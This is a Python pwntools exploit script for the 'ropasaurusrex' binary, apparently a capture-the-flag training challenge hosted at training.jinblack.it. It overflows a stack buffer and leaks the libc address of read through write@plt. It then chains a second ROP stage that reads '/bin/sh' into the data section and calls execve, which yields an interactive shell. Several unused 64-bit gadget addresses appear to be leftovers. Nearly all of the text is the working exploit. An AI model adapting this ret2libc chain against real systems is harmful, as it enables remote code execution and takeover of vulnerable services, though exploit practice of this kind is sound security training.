#!/usr/bin/python3

from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
# context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2014
PROG = "./ropasaurusrex"
LIBC = "./libc-2.27.so"
# context.log_level = 'error'
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    b * 0x0804841c
    command 1
    x /1wx $eip
    end
    """)
    input("wait for gdb")
else:
    r = process(PROG)

read_addr = 0x004497b0 #change rdx ?

pop_rax         = 0x00000000004155a4
pop_rdx         = 0x4497c5
pop_rdi         = 0x400696
pop_rsi         = 0x0000000000410133
syscall         = 0x40128c
push_rsp        = 0x0000000000450a84
int_0x80        = 0x4680fa
push_rdi        = 0x00000000004235e5
gadg1           = 0x000000000047fa0c      #mov rbx, rsp ; mov rsi, rbx ; syscall
main            = 0x00400b95
pop_rdi_syscall = 0x44400d

pop_3 = 0x00018699

"""
Binary is dynamically linked, 32 bit, No PIE, No canary, no RELRO

bpython
from pwn import *
l = ELF("./libc-2.27.so")
p = ELF("./ropasaurusrex")
hex(p.plt['write'])
hex(p.got['write'])
hex(p.symbols['got.write'])
hex(l.symbols['execve'])
hex(next(p.search(b"\x00"*4)))


"""
libc = ELF(LIBC)
bin_sh       = next(libc.search(b"/bin/sh\x00"))
null_addr    = next(libc.search(b"\x00"*4))

prog = ELF(PROG)
read_got = prog.got['read']
read_plt = prog.plt['read']

write_got = prog.got['write']
write_plt = prog.plt['write']


payload     = b"A"*(136 +4)
# payload    += p32(prog.symbols['__libc_start_main'])
# payload    += p32(0x0804841d)
# payload    += b"D"*4

payload    += p32(write_plt)
payload    += p32(0x08048340)       #entry()
payload    += p32(0x1)              #stdout
payload    += p32(read_got)         #write what is at this address
payload    += p32(0x4)
# payload    += p32(pop_3)

r.sendline(payload)
leak = u32(r.recv(4))
print(hex(leak))
print(hex(libc.symbols['read']))
libc.address = leak - libc.symbols['read'] # - 0xb0
log.info("libc base: 0x%x", (libc.address))
log.info("gadget address: 0x%x", (libc.address+pop_3))

payload     = b"A"*(136 +4)
payload    += p32(read_plt)
payload    += p32(libc.address+pop_3) 
# payload    += b"D"*4
      
payload    += p32(0x0)                #stdin
payload    += p32(0x08049620)         #read from stdin and write it at this address - .data
payload    += p32(0x8)                # 
print(hex(libc.symbols['execve']))
payload    += p32(libc.symbols['execve'])
payload    += b"D"*4

payload    += p32(0x08049620)
payload    += p32(0x8048075)
payload    += p32(0x8048075)


r.sendline(payload)
input("Send binsh...")
r.sendline("/bin/sh\x00")



r.interactive()

